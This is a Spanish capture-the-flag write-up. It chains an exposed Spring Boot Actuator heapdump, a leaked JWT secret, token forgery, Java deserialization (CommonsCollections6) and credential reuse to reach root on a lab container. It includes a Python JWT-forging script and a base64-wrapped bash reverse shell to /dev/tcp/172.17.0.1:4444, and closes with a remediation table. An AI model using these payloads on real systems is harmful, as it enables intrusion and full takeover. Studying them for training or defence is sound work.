# Writeup - &quot;Apadrina un Pingüino&quot;
**Máquina 172.17.0.2 (contenedor Docker) — Guía paso a paso**

- **Dificultad:** Media-Alta
- **Tipo:** Web / Spring Boot / Java
- **Objetivo final:** RCE → escalada a root → capturar el flag
- **Flag:** `FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}`

## �� Resumen de la cadena de ataque
Reconocimiento (nmap) ➔ Spring Boot Actuator expuesto sin autenticación ➔ Descarga de
`/actuator/heapdump` ➔ extracción del secreto JWT ➔ Falsificación de JWT (rol USER ➔ ADMIN) ➔
panel `/admin` ➔ POST `/admin/restore` deserializa Java (Base64 + ObjectInputStream) ➔ Gadget
CommonsCollections6 ➔ RCE (www-data) ➔ Credenciales en claro en `/app/.env` ➔ reutilización ➔
root ➔ FLAG.

---

## 1. Preparación del entorno
### 1.1 Comprobar la red
El objetivo es un contenedor Docker; el host que lo ataca ve la red `docker0`.

```bash
ip -4 addr show
```

4: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; ... inet 172.17.0.1/16 brd 172.17.255.255
scope global docker0
```
El atacante es `172.17.0.1` (puerta de enlace de Docker) y la víctima `172.17.0.2`.

### 1.2 Herramientas necesarias
```bash
sudo apt update
sudo apt install -y nmap ffuf gobuster nikto sqlmap curl wget netcat-traditional default-jdk
maven unzip
```
*Nota: `nc` en el contenedor de pruebas debe ser la variante `nc -lvnp`.*

---

## 2. Reconocimiento (nmap)
### 2.1 Descubrimiento de host
```bash
ping -c 3 172.17.0.2
```
`ttl=64` indica Linux, probablemente un contenedor.

### 2.2 Escaneo de puertos y servicios
```bash
nmap -Pn -sS -sV -sC -p- --min-rate 2000 -T4 172.17.0.2 -oA nmap_full
```

Resultado:
```text
PORT STATE SERVICE VERSION
8080/tcp open nagios-nsca Nagios NSCA
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apadrina un Pingüino
```
Interpretación: solo el puerto `8080/tcp` está abierto, sirviendo una aplicación web en Spring
Boot.

---

## 3. Enumeración web
### 3.1 Fuzzing de directorios
Alternativa rápida manual o con `ffuf`:
```bash
for p in admin login register logout pinguinos perfil error actuator actuator/health actuator/env
actuator/heapdump actuator/mappings robots.txt; do
code=$(curl -s -o /dev/null -w &quot;%{http_code}&quot; http://172.17.0.2:8080/$p)
echo &quot;$code /$p&quot;
done
```
Resultados relevantes:
```text
403 /admin
200 /login

200 /register
200 /actuator
200 /actuator/heapdump
200 /actuator/mappings
```
Hallazgo: `/admin` devuelve `403` (requiere privilegios) y aparece un **Spring Boot Actuator**
totalmente accesible.

---

## 4. Spring Boot Actuator expuesto
### 4.1 Mapa de rutas de la aplicación (mappings)
Revisando `/actuator/mappings`:
```text
{GET [/login]} {POST [/login]} AuthController
{GET [/admin]} AdminController.adminPanel
{POST [/admin/restore]} AdminController.restore &lt;-- INTERESANTE
```
`POST /admin/restore` (&quot;restore&quot; = restaurar copia de seguridad) es un candidato claro.

### 4.2 env (información de entorno)
En `/actuator/env` los valores salen enmascarados con `******`, pero confirma que existe la
propiedad `app.jwt.secret` (clave de firma de los JWT). El valor real habrá que buscarlo en el
heapdump.

---

## 5. Registro de usuario y análisis del JWT
### 5.1 Crear una cuenta y decodificar JWT
```bash
curl -s -i -c cookies.txt -X POST http://172.17.0.2:8080/register -d
&quot;username=audit01&amp;email=audit01@test.com&amp;password=Audit1234!&quot;
```
Decodificamos el JWT recibido:
```json
{&quot;sub&quot;: &quot;audit01&quot;, &quot;role&quot;:&quot;USER&quot;, &quot;iat&quot;:1792117419, &quot;exp&quot;:1792121019}
```
Clave: el rol viaja dentro del token (`role: USER`). Si conseguimos el secreto de firma, podemos
forjar un token con `role: ADMIN`.

---

## 6. Fuga de secretos vía heapdump
### 6.1 Descargar el heap y extraer el secreto
```bash
curl -s http://172.17.0.2:8080/actuator/heapdump -o heapdump.hprof
```
Con un script de parseo de HPROF buscando arrays de bytes en memoria que coincidan con la
firma del JWT, obtenemos:
```text
SECRETO JWT: b&#39;changeme-super-secret-key-pinguinos-prod-2024&#39;
```

---

## 7. Falsificación de JWT → escalada a ADMIN
Forjamos un token con `role: ADMIN` usando Python:
```python
import hmac, hashlib, base64, json, time
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b&#39;=&#39;)
secret = b&#39;changeme-super-secret-key-pinguinos-prod-2024&#39;
now = int(time.time())
header = b64(json.dumps({&quot;alg&quot;: &quot;HS256&quot;}).encode())
payload = b64(json.dumps({&quot;sub&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;ADMIN&quot;, &quot;iat&quot;: now, &quot;exp&quot;: now +
3600}).encode())
sig = b64(hmac.new(secret, f&quot;{header.decode()}.{payload.decode()}&quot;.encode(),
hashlib.sha256).digest())
print(f&quot;{header.decode()}.{payload.decode()}.{sig.decode()}&quot;)
```
Accedemos al panel:
```bash
curl -s -H &quot;Cookie: session=$ADMIN_JWT&quot; http://172.17.0.2:8080/admin
```
¡Acceso concedido! Observamos un formulario que envía un objeto serializado en Base64
(`rO0ABXNyAC4uLg==`) hacia `/admin/restore`.

---

## 8. Explotación de deserialización Java → RCE
### 8.1 Preparar el gadget (CommonsCollections6)
Generamos un payload con `commons-collections-3.2.1` para lograr ejecución de comandos:

```bash
# 1) script que ejecutará la víctima
SCRIPT=&#39;bash -i &gt;&amp; /dev/tcp/172.17.0.1/4444 0&gt;&amp;1&#39;
B64=$(echo -n &quot;$SCRIPT&quot; | base64 -w0)
CMD=&quot;bash -c {echo,$B64}|{base64,-d}|bash&quot;

# 2) generar el objeto serializado con la cadena CC6
PAYLOAD=$(java -cp .:commons-collections-3.2.1.jar CC6 &quot;$CMD&quot;)
```

### 8.2 Recibir la shell
Terminal atacante:
```bash
nc -lvnp 4444
```
Enviamos el payload:
```bash
curl -s -X POST http://172.17.0.2:8080/admin/restore -H &quot;Cookie: session=$ADMIN_JWT&quot; --data-
urlencode &quot;backup=$PAYLOAD&quot;
```
¡RCE conseguido como `www-data`!

---

## 9. Post-explotación y escalada a root
### 9.1 Enumeración básica

Revisando variables de entorno en `/app/.env`:
```text
DB_PASSWORD=Prod_Gl4c14r_Sync_2024
RECOVERY_KEY=recoverypasswordpenguin
```

### 9.2 Escalada a root (reutilización de credenciales)
```bash
echo &#39;recoverypasswordpenguin&#39; | su root -c &#39;id&#39;
# uid=0(root) gid=0(root) groups=0(root)
```
**Compromiso total del sistema.**

---

## 10. Remediación

| # | Vulnerabilidad | Remediación |
|---|---|---|
| 1 | Actuator expuesto sin auth | Limitar exposición y requerir autenticación |
| 2 | Secreto JWT en claro | Rotar el secreto y almacenarlo en variables de entorno seguras |
| 3 | Deserialización Java insegura | Usar JSON (Jackson) o implementar filtro JEP 290 |
| 4 | Reutilización de credenciales | Contraseñas únicas para root, deshabilitar acceso directo |
